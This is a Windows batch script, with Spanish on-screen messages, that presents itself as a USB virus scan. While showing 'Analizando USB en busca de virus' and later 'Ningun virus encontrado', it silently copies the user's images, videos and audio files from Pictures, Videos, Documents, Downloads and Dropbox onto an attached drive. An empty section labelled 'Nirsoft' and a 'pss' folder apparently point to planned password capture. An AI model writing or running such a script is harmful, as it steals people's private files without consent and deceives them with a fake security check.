@echo off

set drives= B D E F G H I J K L M N O P Q R S T U V W X Y Z

REM ############ Formats ############
set rest= *.jpg,*.png,*.mp4,*.3gp,*.wav
REM #################################

MSG * Analizando USB en busca de virus.

mkdir data\capt\%USERNAME%
mkdir data\pss\%USERNAME%

FOR %%# IN (%DRIVES%) DO (If Exist "%%#:\" (FOR /R "%userprofile%\Mis documentos\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")

REM ############ Folders ############
FOR /R "%userprofile%\Pictures\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
FOR /R "%userprofile%\Videos\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
FOR /R "%userprofile%\Documents\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
FOR /R "%userprofile%\Downloads\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
FOR /R "%userprofile%\Dropbox\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")

REM #################################

)
)

REM ############ Nirsoft ############

REM #################################

MSG * Ningun virus encontrado.

exit